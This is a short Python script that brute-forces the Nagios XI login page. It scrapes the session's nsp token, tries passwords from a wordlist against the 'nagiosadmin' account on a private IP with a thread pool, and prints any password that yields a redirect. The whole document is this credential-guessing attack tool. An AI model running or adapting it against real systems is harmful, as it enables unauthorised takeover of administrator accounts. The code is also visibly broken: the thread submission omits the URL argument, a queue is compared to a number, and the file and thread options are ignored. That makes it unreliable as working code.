#!/usr/bin/env python3
import requests
import re
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

def test_pw(url, username,password):
    s=requests.Session()
    s.verify=False
    nsp=re.findall(r'nsp_str\s=\s"(.+?)"',s.get(url).text)[0]
    ret = s.post(url,data={'page': 'auth','username': username,'pageopt': 'login','loginButton': '','debug': '',
                         'password': password,"nsp": nsp},allow_redirects=False)
    if ret.status_code == 302:
        print(f'Password: {password}')
    s.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', default='https://192.168.209.136/nagiosxi/login.php')
    parser.add_argument('--username',default='nagiosadmin')
    parser.add_argument('--pass_file',default='./p')
    parser.add_argument('--threads', default=50)
    args = parser.parse_args()
    
    TPE = ThreadPoolExecutor()
    
    for password in open('p').readlines():
        while TPE._work_queue > 50000:
            time.sleep(1)
        TPE.submit(test_pw,args.username,password.strip('\n'))